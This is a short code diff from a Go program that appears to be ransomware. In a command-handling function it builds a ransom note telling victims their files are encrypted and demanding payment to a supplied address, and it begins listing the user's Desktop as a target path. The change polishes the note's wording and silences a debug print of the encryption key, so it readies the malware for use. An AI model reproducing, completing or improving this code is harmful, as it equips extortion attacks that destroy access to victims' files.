@@ -597,8 +597,8 @@ func doInstru(ic, iv string) string {
 				fmt.Println("error ransom key:", err)
 				out = "Error:" + err.Error()
 			} else {
-				text := fmt.Sprintf("All your files have been encrypted. Do not bother searching online. Only people on earth that can decrypt your files are us.\nTo start decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
-				fmt.Println("RANSOOOM", iv, key, text)
+				text := fmt.Sprintf("All your files have been encrypted. Do not bother searching online. The only people on earth that can decrypt your files are us.\nTo start decryption process, send %s %s to this address:\n%s", ivspl[0], ivspl[1], ivspl[2])
+				// fmt.Println("RANSOOOM", iv, key, text)
 
 				target_paths := []string{
 					mainDrive + "\\" + "Users\\" + username + "\\Desktop",
